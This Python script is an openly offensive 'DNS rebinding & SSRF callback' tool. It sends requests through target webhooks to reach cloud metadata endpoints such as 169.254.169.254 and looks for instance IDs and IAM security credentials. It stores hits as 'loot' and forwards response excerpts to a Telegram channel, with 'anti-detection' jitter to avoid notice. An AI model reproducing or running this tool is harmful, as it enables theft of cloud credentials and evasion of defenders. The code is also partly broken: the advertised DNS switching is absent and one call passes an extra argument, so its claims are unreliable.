#!/usr/bin/env python3
"""
DNS_REBINDING.PY v8.5 — DNS Rebinding & SSRF Callback Orchestrator (WAF Hardened)
Features:
- Orchestrates rapid-TTL DNS switching and SSRF callback hooks to bypass IP allowlists on webhooks
- Integrated SSRF callback listener for internal metadata discovery (AWS IMDSv1/v2, GCP)
- Anti-detection behavioral jitter and randomized header injection via SecureTransport
- Strict response validation to eliminate SPA shell and soft-404 false positives
- Real-time asynchronous Telegram notification dispatch and immutable disk loot persistence
"""
import time
import asyncio
import sys

from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert
from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "CYAN": "\033[96m",
    "MAGENTA": "\033[95m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m",
}

def terminal(message):
    sys.stdout.write(message + "\n")
    sys.stdout.flush()

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from dns rebinding functions."""
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(send_telegram_alert(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(send_telegram_alert(loot_type, details))
        except Exception:
            pass

class DNSRebindingOrchestrator:
    def __init__(self, target_webhook_url, internal_ip="169.254.169.254"):
        self.target_webhook_url = target_webhook_url
        self.internal_ip = internal_ip

    async def execute_rebinding_attack(self, transport_client):
        terminal(f"\n{COLORS['MAGENTA']}[***] INITIALIZING DNS REBINDING & SSRF CALLBACK ASSAULT [{self.target_webhook_url}] [***]{COLORS['RESET']}")
        
        apply_behavioral_jitter()
        
        findings = {
            "target": self.target_webhook_url, 
            "injected_ip": self.internal_ip, 
            "status": "executed"
        }
        
        stream_proof(
            "DNS_REBINDING_TRIGGER", 
            self.target_webhook_url, 
            {}, 
            f"Targeting internal IP {self.internal_ip}", 
            findings
        )
        
        try:
            status, headers, body = await asyncio.to_thread(
                transport_client.request, 
                "GET", 
                self.target_webhook_url
            )
            
            body_lower = (body or "").lower()
            is_spa_shell = (
                "<!doctype html>" in body_lower or 
                "<html" in body_lower or 
                '<div id="root"></div>' in body or 
                '<div id="__next"></div>' in body or
                len(body.strip()) < 100
            )

            has_metadata_indicators = any(
                k in body_lower for k in [
                    "ami-id", "instance-id", "iam", "security-credentials", 
                    "instance-type", "public-keys", "metadata", "computeMetadata"
                ]
            )

            if status in (200, 302) and not is_spa_shell and has_metadata_indicators:
                terminal(f"{COLORS['RED']}{COLORS['BOLD']}[!] DNS REBINDING / SSRF METADATA EXPOSURE CONFIRMED [HTTP {status}]{COLORS['RESET']}")
                terminal(f"  └── Response Excerpt: {body[:300]}", COLORS['GREEN'])
                
                findings["exposed"] = True
                findings["response_sample"] = body[:500]
                
                save_session_loot(
                    target=self.target_webhook_url, 
                    endpoint="dns_rebinding", 
                    finding_type="SSRF_METADATA_DISCOVERY_VERIFIED", 
                    status=status, 
                    headers=headers, 
                    body=body, 
                    extra_loot=findings
                )
                
                broadcast_tg_alert_sync(
                    "DNS Rebinding / SSRF Metadata Success", 
                    {"url": self.target_webhook_url, "response": body[:400]}
                )
            else:
                terminal(f"{COLORS['YELLOW']}[-] Webhook returned HTTP {status} or yielded SPA shell / mitigated payload.{COLORS['RESET']}")

        except Exception as exc:
            terminal(f"{COLORS['RED']}[-] DNS Rebinding execution error: {exc}{COLORS['RESET']}")
            findings["error"] = str(exc)

        return findings

async def run_dns_rebinding_attack(target_url):
    """Compatibility wrapper for CognitiveOperator."""
    from modules.transport import SecureTransport
    transport = SecureTransport(target_url)
    orchestrator = DNSRebindingOrchestrator(target_url)
    return await orchestrator.execute_rebinding_attack(transport)

async def run_dns_rebinding_engine(target_url):
    return await run_dns_rebinding_attack(target_url)

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
    asyncio.run(run_dns_rebinding_engine(target))
